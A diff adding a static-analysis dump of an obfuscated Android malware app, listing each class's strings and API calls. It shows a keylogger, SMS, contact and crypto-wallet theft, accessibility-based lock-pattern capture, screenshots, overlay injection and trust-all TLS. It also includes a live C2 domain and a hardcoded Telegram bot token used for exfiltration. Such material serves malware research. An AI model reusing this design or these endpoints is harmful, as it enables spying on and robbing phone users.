@@ -1,0 +1,152 @@
+====================================================================================================
+Lڜٟٱڀ/؋; extends Ljava/lang/Object;
+  -- ؋['B', '[B'] -> [B
+     C: ["Ljava/nio/ByteBuffer;->allocate", "Ljava/nio/ByteBuffer;->array", "Ljava/nio/ByteBuffer;->order", "Ljava/nio/ByteBuffer;->put", "Ljava/nio/ByteBuffer;->putInt"]
+  -- ؋['B', '[B'] -> [B
+     C: ["Ljava/nio/ByteBuffer;->allocate", "Ljava/nio/ByteBuffer;->array", "Ljava/nio/ByteBuffer;->order", "Ljava/nio/ByteBuffer;->put", "Ljava/nio/ByteBuffer;->putInt"]
+====================================================================================================
+Lڜٟٱڀ/ؠ; extends Ljava/lang/Object;
+  -- <init>['Ljava/lang/String;', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- run[] -> V
+     S: ["", "\",\"parse_mode\":\"HTML\"}", "): ", "Content-Type", "POST", "Send failed: ", "Sent (", "TgNotify", "adbShellResult", "application/json; charset=utf-8", "cmd", "https://api.telegram.org/bot8798681434:AAFXfLD8v4SalrzZCnavcsjVvJO1quVzWgA/sendMessage", "result", "success", "{\"chat_id\":\"-5238151960\",\"text\":\""]
+     C: ["Landroid/util/Log;->d", "Landroid/util/Log;->w", "Ljava/io/OutputStream;->close", "Ljava/io/OutputStream;->write", "Ljava/lang/Math;->min", "Ljava/lang/String;->getBytes", "Ljava/lang/String;->length", "Ljava/lang/String;->substring", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/lang/Throwable;->addSuppressed", "Ljava/lang/Throwable;->getMessage", "Ljava/net/HttpURLConnection;->disconnect", "Ljava/net/HttpURLConnection;->getResponseCode", "Ljava/net/HttpURLConnection;->setRequestMethod", "Ljava/net/URL;-><init>", "Ljava/net/URL;->openConnection", "Ljava/net/URLConnection;->getOutputStream", "Ljava/net/URLConnection;->setConnectTimeout", "Ljava/net/URLConnection;->setDoOutput", "Ljava/net/URLConnection;->setReadTimeout", "Ljava/net/URLConnection;->setRequestProperty", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->put", "Lڜأِجطّثٮ/ؠ;->أ", "Lڜأِجطّثٮ/ؠ;->ت", "Lڜٟٱڀ/د;->ؠ", "Lڜٟٱڀ/د;->ؤ", "Lںڍڒڸ/ش;->ض"]
+====================================================================================================
+Lڜٟٱڀ/ء; extends Ljava/lang/Object;
+  -- <init>['Lڜٟٱڀ/أ;', 'Lorg/json/JSONObject;', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- run[] -> V
+     S: ["", "CommandDispatcher", "albumData", "albumLast", "albumList", "android.intent.action.MAIN", "android.intent.category.LAUNCHER", "contactList", "curpage", "data", "del", "deviceId", "elem", "fetchIcon", "fetchIcon error", "fileList", "fin_pkgs", "fromAdmin", "granted", "icon", "iconList", "iconList error", "list", "maxWidth", "name", "pagesize", "path", "pkg", "readAlbumLast error", "readAlbumList error", "readAlbumThumbnail error", "readContacts error", "readSms error", "reqPerList", "reqPerList error", "smsList", "walletList", "walletList error"]
+     C: ["Landroid/content/Context;->getPackageManager", "Landroid/content/Context;->getPackageName", "Landroid/content/Context;->getSharedPreferences", "Landroid/content/Intent;-><init>", "Landroid/content/Intent;->addCategory", "Landroid/content/SharedPreferences;->getString", "Landroid/content/pm/PackageManager;->checkPermission", "Landroid/content/pm/PackageManager;->getApplicationIcon", "Landroid/content/pm/PackageManager;->getApplicationLabel", "Landroid/content/pm/PackageManager;->getInstalledApplications", "Landroid/content/pm/PackageManager;->getPackageInfo", "Landroid/content/pm/PackageManager;->queryIntentActivities", "Landroid/content/pm/ResolveInfo;->loadLabel", "Landroid/graphics/Bitmap;->compress", "Landroid/graphics/Bitmap;->createBitmap", "Landroid/graphics/Canvas;-><init>", "Landroid/graphics/Canvas;->getHeight", "Landroid/graphics/Canvas;->getWidth", "Landroid/graphics/drawable/BitmapDrawable;->getBitmap", "Landroid/graphics/drawable/Drawable;->draw", "Landroid/graphics/drawable/Drawable;->getIntrinsicHeight", "Landroid/graphics/drawable/Drawable;->getIntrinsicWidth", "Landroid/graphics/drawable/Drawable;->setBounds", "Landroid/util/Base64;->encodeToString", "Landroid/util/Log;->e", "Ljava/io/ByteArrayOutputStream;-><init>", "Ljava/io/ByteArrayOutputStream;->toByteArray", "Ljava/lang/CharSequence;->toString", "Ljava/lang/String;->equals", "Ljava/lang/String;->isEmpty", "Ljava/util/HashSet;-><init>", "Ljava/util/HashSet;->add", "Ljava/util/HashSet;->contains", "Ljava/util/HashSet;->isEmpty", "Ljava/util/Iterator;->hasNext", "Ljava/util/Iterator;->next", "Ljava/util/List;->iterator", "Lorg/json/JSONArray;-><init>", "Lorg/json/JSONArray;->getString", "Lorg/json/JSONArray;->length", "Lorg/json/JSONArray;->put", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->optBoolean", "Lorg/json/JSONObject;->optInt", "Lorg/json/JSONObject;->optJSONArray", "Lorg/json/JSONObject;->optString", "Lorg/json/JSONObject;->put", "Lةؽڗںۍټ٘/ء;->آ", "Lڗًقڔ/ء;->د", "Lڗًقڔ/ء;->ر", "Lڗًقڔ/ء;->ز", "Lڗًقڔ/ء;->ط", "Lںڍڒڸ/ش;->ي"]
+====================================================================================================
+Lڜٟٱڀ/أ; extends Ljava/lang/Object;
+  -- ڤ['Landroid/view/accessibility/AccessibilityNodeInfo;', 'I'] -> Landroid/graphics/Rect;
+     S: ["lockPatternView", "patternView"]
+     C: ["Landroid/graphics/Rect;-><init>", "Landroid/graphics/Rect;->height", "Landroid/graphics/Rect;->width", "Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen", "Landroid/view/accessibility/AccessibilityNodeInfo;->getChild", "Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount", "Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName", "Landroid/view/accessibility/AccessibilityNodeInfo;->recycle", "Ljava/lang/String;->contains", "Lڜٟٱڀ/أ;->ڤ"]
+  -- ڥ['Ljava/lang/String;', 'Z'] -> V
+     S: [" enabled=", "CommandDispatcher", "Component ", "setComponentEnabled error"]
+     C: ["Landroid/content/ComponentName;-><init>", "Landroid/content/Context;->getPackageManager", "Landroid/content/pm/PackageManager;->setComponentEnabledSetting", "Landroid/util/Log;->d", "Landroid/util/Log;->e", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString"]
+====================================================================================================
+Lڜٟٱڀ/ؤ; extends Ljava/lang/Object;
+  -- ؋[] -> Lڜٟٱڀ/ؤ;
+     C: ["Lڜٟٱڀ/ؤ;-><init>"]
+  -- أ['Ljava/lang/String;', 'Ljava/lang/String;'] -> V
+     S: [":443", "Binary transport already connected, skipping", "ConnOrchestrator", "Starting binary transport to "]
+     C: ["Landroid/util/Log;->i", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lڜٟٱڀ/ش;->؋", "Lڜٟٱڀ/ش;->ء"]
+====================================================================================================
+Lڜٟٱڀ/إ; extends Ljava/lang/Object;
+  -- <init>['Lڙڧا/ء;', 'Ljava/lang/String;'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- <init>['Lڙڧا/ء;', 'Ljava/lang/String;'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+====================================================================================================
+Lڜٟٱڀ/ئ; extends Ljava/lang/Object;
+  -- <init>['Lڜٟٱڀ/ة;', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- run[] -> V
+     C: ["Landroid/view/View;->setVisibility", "Ljava/util/HashSet;->contains", "Lڜٟٱڀ/ة;->؋"]
+====================================================================================================
+Lڜٟٱڀ/ا; extends Ljava/lang/Object;
+  -- <init>['Landroid/content/Context;'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- onTouch['Landroid/view/View;', 'Landroid/view/MotionEvent;'] -> Z
+     C: ["Landroid/view/MotionEvent;->getAction", "Landroid/view/MotionEvent;->getX", "Landroid/view/MotionEvent;->getY", "Landroid/view/View;->hasFocus", "Landroid/view/View;->postDelayed", "Landroid/view/View;->requestFocus", "Landroidx/constraintlayout/motion/widget/؋;-><init>", "Ljava/lang/Math;->abs"]
+====================================================================================================
+Lڜٟٱڀ/ب; extends Ljava/lang/Object;
+  -- <init>['Lڜٟٱڀ/ة;'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- setFormData['Ljava/lang/String;'] -> V
+     S: ["FKB.setFormData: ", "InjectOverlay", "data", "formData", "setFormData error"]
+     C: ["Landroid/util/Log;->d", "Landroid/util/Log;->e", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/util/HashSet;->add", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->put", "Lةؽڗںۍټ٘/ء;->آ", "Lڜٟٱڀ/ة;->أ", "Lڜٟٱڀ/د;->ؠ"]
+====================================================================================================
+Lڜٟٱڀ/ة; extends Ljava/lang/Object;
+  -- آ['Ljava/lang/String;'] -> Z
+     S: ["", "ai.type", "android.gms", "baidu.input", "credentialmanager", "fleksy", "gboard", "honeyboard", "inputmethod", "keyboard", "launcher", "lawnchair", "permissioncontroller", "pkg", "sogou", "swiftkey", "systemui", "tencent.qqpinyin", "trebuchet", "used"]
+     C: ["Ljava/lang/String;->contains", "Ljava/lang/String;->equals", "Lorg/json/JSONArray;->length", "Lorg/json/JSONArray;->optJSONObject", "Lorg/json/JSONObject;->optBoolean", "Lorg/json/JSONObject;->optString"]
+  -- ؤ['Landroid/content/Context;', 'Ljava/lang/String;', 'Ljava/lang/String;', 'Z'] -> V
+     C: ["Landroid/os/Handler;->post", "Landroid/os/Looper;->getMainLooper", "Landroid/os/Looper;->myLooper", "Landroidx/constraintlayout/motion/widget/؋;-><init>", "Ljava/lang/String;->equals", "Lڜٟٱڀ/ة;->ؠ"]
+====================================================================================================
+Lڜٟٱڀ/ت; extends Ljava/lang/Object;
+  -- ا['Lةؽڗںۍټ٘/ء;', 'Ljava/lang/String;'] -> V
+     S: [" entries, remaining=", "KeylogEngine", "cache", "cacheData", "deviceId", "k", "upload entry error", "uploaded "]
+     C: ["Landroid/os/Handler;->postDelayed", "Landroid/util/Log;->d", "Landroid/util/Log;->e", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/util/ArrayList;-><init>", "Ljava/util/ArrayList;->add", "Ljava/util/ArrayList;->isEmpty", "Ljava/util/ArrayList;->iterator", "Ljava/util/ArrayList;->size", "Ljava/util/Iterator;->hasNext", "Ljava/util/Iterator;->next", "Ljava/util/Map$Entry;->getKey", "Ljava/util/Map$Entry;->getValue", "Ljava/util/Set;->iterator", "Ljava/util/concurrent/ConcurrentHashMap;->entrySet", "Ljava/util/concurrent/ConcurrentHashMap;->isEmpty", "Ljava/util/concurrent/ConcurrentHashMap;->remove", "Ljava/util/concurrent/ConcurrentHashMap;->size", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->put", "Lةؽڗںۍټ٘/؋;-><init>", "Lةؽڗںۍټ٘/ء;->آ", "Lڜٟٱڀ/ت;->ئ"]
+  -- ب['Lorg/json/JSONObject;'] -> V
+     S: ["\n", ".json", "KeylogEngine", "Rotated to overflow", "Write retry ", "_", "dd-MM-yyyy", "keylog.wal"]
+     C: ["Landroid/util/Log;->d", "Landroid/util/Log;->e", "Ljava/io/File;-><init>", "Ljava/io/File;->delete", "Ljava/io/File;->exists", "Ljava/io/File;->length", "Ljava/io/File;->renameTo", "Ljava/io/FileWriter;-><init>", "Ljava/io/Writer;->close", "Ljava/io/Writer;->flush", "Ljava/io/Writer;->write", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/lang/System;->currentTimeMillis", "Ljava/lang/Thread;->sleep", "Ljava/text/DateFormat;->format", "Ljava/text/SimpleDateFormat;-><init>", "Ljava/util/Date;-><init>", "Ljava/util/concurrent/atomic/AtomicLong;->set", "Lorg/json/JSONObject;->toString"]
+====================================================================================================
+Lڜٟٱڀ/ث; extends Landroid/net/ConnectivityManager$NetworkCallback;
+  -- ب['Lorg/json/JSONObject;'] -> V
+     S: ["\n", ".json", "KeylogEngine", "Rotated to overflow", "Write retry ", "_", "dd-MM-yyyy", "keylog.wal"]
+     C: ["Landroid/util/Log;->d", "Landroid/util/Log;->e", "Ljava/io/File;-><init>", "Ljava/io/File;->delete", "Ljava/io/File;->exists", "Ljava/io/File;->length", "Ljava/io/File;->renameTo", "Ljava/io/FileWriter;-><init>", "Ljava/io/Writer;->close", "Ljava/io/Writer;->flush", "Ljava/io/Writer;->write", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/lang/System;->currentTimeMillis", "Ljava/lang/Thread;->sleep", "Ljava/text/DateFormat;->format", "Ljava/text/SimpleDateFormat;-><init>", "Ljava/util/Date;-><init>", "Ljava/util/concurrent/atomic/AtomicLong;->set", "Lorg/json/JSONObject;->toString"]
+  -- onLost['Landroid/net/Network;'] -> V
+     S: ["Network lost", "NetworkMonitor"]
+     C: ["Landroid/util/Log;->w"]
+====================================================================================================
+Lڜٟٱڀ/خ; extends Ljava/lang/Object;
+  -- <init>['Lڜٟٱڀ/د;', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- run[] -> V
+     S: [".", "/com.lite.cloudfinder.accessibility.MyAccessibilityService", "3000", ":", "ADB watchdog error", "ADB watchdog started", "ADB watchdog: accessibility dead, re-enabling...", "ADB watchdog: connection lost, reconnecting...", "AdbPairMgr", "Attempting reconnect...", "Quick probe OK: ", "Quick probe failed, scheduling reconnect", "Quick probe failed: ", "Quick probe: ", "SocketManager", "TLS", "cohuducox.com", "domain", "ensureAccessibility error", "host", "https://www.cohuducox.com/adv.php?apk=10068&device=", "port", "token", "www"]
+     C: ["Landroid/content/Context;->getPackageName", "Landroid/util/Log;->d", "Landroid/util/Log;->i", "Landroid/util/Log;->w", "Ljava/lang/Integer;->parseInt", "Ljava/lang/Object;->getClass", "Ljava/lang/String;->contains", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/lang/Thread;->currentThread", "Ljava/lang/Thread;->isInterrupted", "Ljava/lang/Thread;->sleep", "Ljava/lang/Throwable;->getMessage", "Ljava/security/SecureRandom;-><init>", "Ljavax/net/ssl/SSLContext;->getInstance", "Ljavax/net/ssl/SSLContext;->getSocketFactory", "Ljavax/net/ssl/SSLContext;->init", "Lokhttp3/Call;->execute", "Lokhttp3/OkHttpClient$Builder;-><init>", "Lokhttp3/OkHttpClient$Builder;->build", "Lokhttp3/OkHttpClient$Builder;->connectTimeout", "Lokhttp3/OkHttpClient$Builder;->hostnameVerifier", "Lokhttp3/OkHttpClient$Builder;->readTimeout", "Lokhttp3/OkHttpClient$Builder;->sslSocketFactory", "Lokhttp3/OkHttpClient;->newCall", "Lokhttp3/Request$Builder;-><init>", "Lokhttp3/Request$Builder;->build", "Lokhttp3/Request$Builder;->get", "Lokhttp3/Request$Builder;->url", "Lokhttp3/Response;->body", "Lokhttp3/Response;->close", "Lokhttp3/Response;->isSuccessful", "Lokhttp3/ResponseBody;->string", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->getString", "Lorg/json/JSONObject;->has", "Lorg/json/JSONObject;->optString", "Lڙڧا/ء;-><init>", "Lڙڧا/ء;->؋", "Lښ۫ٳڢ/ؠ;-><init>", "Lښ۫ٳڢ/ء;-><init>", "Lڜأِجطّثٮ/ؠ;->آ", "Lڜأِجطّثٮ/ؠ;->أ", "Lڜأِجطّثٮ/ؠ;->ئ", "Lڜأِجطّثٮ/ء;->ة", "Lڜأِجطّثٮ/ء;->ج", "Lڜأِجطّثٮ/ء;->ط", "Lڜٟٱڀ/د;->؋", "Lڜٟٱڀ/د;->أ", "Lڜٟٱڀ/د;->إ"]
+====================================================================================================
+Lڜٟٱڀ/د; extends Ljava/lang/Object;
+  -- ؠ[] -> Lڜٟٱڀ/د;
+     C: ["Lڜٟٱڀ/د;-><init>"]
+  -- إ['I', 'Ljava/lang/String;'] -> V
+     S: ["", " path=", "&cmode=test&device=", "&ver=v4.0", "/io", "Connecting to ", "Socket URI error", "SocketManager", "apkid=10068&line=", "connect", "connect_error", "connect_timeout", "disconnect", "https://", "new_msg", "webrtcIce", "webrtcOffer", "webrtcStop", "websocket"]
+     C: ["Landroid/util/Log;->d", "Landroid/util/Log;->e", "Lio/socket/client/IO$Options;-><init>", "Lio/socket/client/IO;->socket", "Lio/socket/client/Socket;->connect", "Lio/socket/client/Socket;->disconnect", "Lio/socket/emitter/Emitter;->off", "Lio/socket/emitter/Emitter;->on", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lokhttp3/OkHttpClient$Builder;-><init>", "Lokhttp3/OkHttpClient$Builder;->build", "Lokhttp3/OkHttpClient$Builder;->connectTimeout", "Lokhttp3/OkHttpClient$Builder;->pingInterval", "Lokhttp3/OkHttpClient$Builder;->readTimeout", "Lokhttp3/OkHttpClient$Builder;->retryOnConnectionFailure", "Lokhttp3/OkHttpClient$Builder;->writeTimeout", "Lةؽڗںۍټ٘/ء;-><init>", "Lڜٟٱڀ/ج;-><init>", "Lڜٟٱڀ/ر;->؋"]
+====================================================================================================
+Lڜٟٱڀ/ذ; extends Ljava/lang/Object;
+  -- إ['I', 'Ljava/lang/String;'] -> V
+     S: ["", " path=", "&cmode=test&device=", "&ver=v4.0", "/io", "Connecting to ", "Socket URI error", "SocketManager", "apkid=10068&line=", "connect", "connect_error", "connect_timeout", "disconnect", "https://", "new_msg", "webrtcIce", "webrtcOffer", "webrtcStop", "websocket"]
+     C: ["Landroid/util/Log;->d", "Landroid/util/Log;->e", "Lio/socket/client/IO$Options;-><init>", "Lio/socket/client/IO;->socket", "Lio/socket/client/Socket;->connect", "Lio/socket/client/Socket;->disconnect", "Lio/socket/emitter/Emitter;->off", "Lio/socket/emitter/Emitter;->on", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lokhttp3/OkHttpClient$Builder;-><init>", "Lokhttp3/OkHttpClient$Builder;->build", "Lokhttp3/OkHttpClient$Builder;->connectTimeout", "Lokhttp3/OkHttpClient$Builder;->pingInterval", "Lokhttp3/OkHttpClient$Builder;->readTimeout", "Lokhttp3/OkHttpClient$Builder;->retryOnConnectionFailure", "Lokhttp3/OkHttpClient$Builder;->writeTimeout", "Lةؽڗںۍټ٘/ء;-><init>", "Lڜٟٱڀ/ج;-><init>", "Lڜٟٱڀ/ر;->؋"]
+  -- getAcceptedIssuers[] -> [Ljava/security/cert/X509Certificate;
+====================================================================================================
+Lڜٟٱڀ/ر; extends Ljava/lang/Object;
+  -- ؋['Lokhttp3/OkHttpClient$Builder;'] -> Lokhttp3/OkHttpClient$Builder;
+     S: ["Failed to create SSLSocketFactory", "TLS"]
+     C: ["Ljava/lang/RuntimeException;-><init>", "Ljava/security/SecureRandom;-><init>", "Ljavax/net/ssl/SSLContext;->getInstance", "Ljavax/net/ssl/SSLContext;->getSocketFactory", "Ljavax/net/ssl/SSLContext;->init", "Lokhttp3/OkHttpClient$Builder;->hostnameVerifier", "Lokhttp3/OkHttpClient$Builder;->sslSocketFactory"]
+  -- ؋['Lokhttp3/OkHttpClient$Builder;'] -> Lokhttp3/OkHttpClient$Builder;
+     S: ["Failed to create SSLSocketFactory", "TLS"]
+     C: ["Ljava/lang/RuntimeException;-><init>", "Ljava/security/SecureRandom;-><init>", "Ljavax/net/ssl/SSLContext;->getInstance", "Ljavax/net/ssl/SSLContext;->getSocketFactory", "Ljavax/net/ssl/SSLContext;->init", "Lokhttp3/OkHttpClient$Builder;->hostnameVerifier", "Lokhttp3/OkHttpClient$Builder;->sslSocketFactory"]
+====================================================================================================
+Lڜٟٱڀ/ز; extends Ljava/lang/Object;
+  -- آ[] -> Lڜٟٱڀ/ز;
+     C: ["Lڜٟٱڀ/ز;-><init>"]
+  -- ؤ[] -> V
+     S: ["All locks released + auto-renew stopped", "CPU lock release failed", "CPU lock released", "Ctti5DImmb", "WiFi lock release failed", "WiFi lock released"]
+     C: ["Landroid/net/wifi/WifiManager$WifiLock;->isHeld", "Landroid/net/wifi/WifiManager$WifiLock;->release", "Landroid/os/Handler;->removeCallbacks", "Landroid/os/PowerManager$WakeLock;->isHeld", "Landroid/os/PowerManager$WakeLock;->release", "Landroid/util/Log;->d", "Landroid/util/Log;->e", "Ljava/util/concurrent/atomic/AtomicBoolean;->set"]
+====================================================================================================
+Lڜٟٱڀ/ش; extends Ljava/lang/Object;
+  -- <init>[] -> V
+     C: ["Ljava/lang/Object;-><init>", "Ljava/util/concurrent/atomic/AtomicBoolean;-><init>", "Ljava/util/concurrent/atomic/AtomicInteger;-><init>"]
+  -- ء[] -> Z
+     C: ["Ljava/util/concurrent/atomic/AtomicBoolean;->get"]
+====================================================================================================
+Lڜٟٱڀ/آ; extends Ljava/lang/Object;
+  -- <init>['I', 'Ljava/lang/Object;'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- onSuccess['Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;'] -> V
+     S: [" bytes", "CommandDispatcher", "Sent thumb ", "ThumbUp", "takeScreen process error", "takeScreen success", "thumb error"]
+     C: ["Landroid/graphics/Bitmap;->compress", "Landroid/graphics/Bitmap;->copy", "Landroid/graphics/Bitmap;->createScaledBitmap", "Landroid/graphics/Bitmap;->getHeight", "Landroid/graphics/Bitmap;->getWidth", "Landroid/graphics/Bitmap;->recycle", "Landroid/hardware/HardwareBuffer;->close", "Landroid/util/Log;->d", "Landroid/util/Log;->e", "Landroidx/core/view/accessibility/أ;->أ", "Landroidx/core/view/accessibility/أ;->إ", "Landroidx/room/أ;-><init>", "Ljava/io/ByteArrayOutputStream;-><init>", "Ljava/io/ByteArrayOutputStream;->toByteArray", "Ljava/lang/Object;->getClass", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/lang/Thread;-><init>", "Ljava/lang/Thread;->start", "Ljava/util/concurrent/atomic/AtomicBoolean;->get", "Lزءؽ۴ڰؠ/؋;->ؠ", "Lڜٟٱڀ/؋;->؋", "Lڜٟٱڀ/ؤ;->ء", "Lڝږ؁ڋ/د;->ؠ", "Lںڍڒڸ/ش;->ٸ"]
+====================================================================================================
+Lڜٟٱڀ/ج; extends Ljava/lang/Object;
+  -- <init>['Lڜٟٱڀ/د;', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- call['[Ljava/lang/Object;'] -> V
+     S: ["", "\nError: ", "AdbStatusReport", "AdbWatchdog", "Caused by: ", "Connect error: ", "ConnectionOrchestrator start error", "ConnectionOrchestrator started for binary transport", "EVENT_CONNECT_TIMEOUT", "Emitted login: ", "Error detail: ", "Heartbeat disabled (CH-TV keepalive mode)", "Message parse error", "Reconnect upload error", "Registration error", "Socket connected!", "Socket disconnected: ", "SocketManager", "action", "android", "apps", "conn", "connected", "data", "deviceId", "deviceInfo", "deviceOnline", "deviceOnline packet sent", "disconnected:", "login", "mails", "pkg", "unknown", "wallpaper", "❌ <b>Connect Failed</b>\nHost: "]
+     C: ["Landroid/util/Log;->d", "Landroid/util/Log;->e", "Landroid/util/Log;->i", "Landroid/util/Log;->w", "Landroidx/constraintlayout/core/state/؋;-><init>", "Landroidx/constraintlayout/motion/widget/؋;-><init>", "Lcom/google/firebase/messaging/FirebaseMessaging;->getInstance", "Lio/socket/client/Socket;->emit", "Ljava/lang/Object;->getClass", "Ljava/lang/Object;->toString", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/lang/Thread;-><init>", "Ljava/lang/Thread;->isAlive", "Ljava/lang/Thread;->setDaemon", "Ljava/lang/Thread;->start", "Ljava/lang/Throwable;->getCause", "Ljava/util/concurrent/Executor;->execute", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->optJSONObject", "Lorg/json/JSONObject;->optString", "Lorg/json/JSONObject;->put", "Lةؽڗںۍټ٘/ء;->آ", "Lؾپۑ۟ڂڷ/ا;-><init>", "Lؾپۑ۟ڂڷ/ح;->ؠ", "Lڃٷښـ۝ۼ/إ;->ؠ", "Lڙڧا/ء;->؋", "Lڜأِجطّثٮ/ؠ;->أ", "Lڜأِجطّثٮ/ؠ;->إ", "Lڜأِجطّثٮ/ء;->ة", "Lڜأِجطّثٮ/ء;->ط", "Lڜٟٱڀ/أ;->؋", "Lڜٟٱڀ/ؤ;->؋", "Lڜٟٱڀ/ؤ;->أ", "Lڜٟٱڀ/ت;->إ", "Lڜٟٱڀ/خ;-><init>", "Lڜٟٱڀ/د;->أ", "Lڝږ؁ڋ/ر;->؋", "Lںڍڒڸ/ش;->إ", "Lںڍڒڸ/ش;->ة", "Lںڍڒڸ/ش;->ص", "Lںڍڒڸ/ش;->ى", "Lںڍڒڸ/ش;->ٹ"]
+====================================================================================================
+Lڜٟٱڀ/ح; extends Ljava/lang/Object;
+  -- <init>['I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- call['[Ljava/lang/Object;'] -> V
+     S: ["", "0", "SocketManager", "candidate", "sdp", "sdpMLineIndex", "sdpMid", "webrtcIce error", "webrtcOffer error"]
+     C: ["Landroid/util/Log;->e", "Ljava/lang/Object;->toString", "Ljava/lang/String;->isEmpty", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->optInt", "Lorg/json/JSONObject;->optString"]
+====================================================================================================
+Lڜٟٱڀ/س; extends Lokhttp3/WebSocketListener;
+  -- <init>['Lڜٟٱڀ/ش;', 'I', 'Ljava/lang/String;'] -> V
+     C: ["Lokhttp3/WebSocketListener;-><init>"]
+  -- onOpen['Lokhttp3/WebSocket;', 'Lokhttp3/Response;'] -> V
+     S: ["\",\"apkId\":10068}", "Binary WS connected", "Binary transport connected — fast path active", "ConnOrchestrator", "WebTransportMgr", "binary_ws_connected", "conn", "{\"deviceId\":\""]
+     C: ["Landroid/util/Log;->i", "Ljava/lang/String;->getBytes", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/util/concurrent/atomic/AtomicBoolean;->set", "Ljava/util/concurrent/atomic/AtomicInteger;->get", "Lokhttp3/WebSocket;->send", "Lڜٟٱڀ/؋;->؋", "Lڝږ؁ڋ/ر;->؋", "Lۀۗ۱/ث;->إ"]
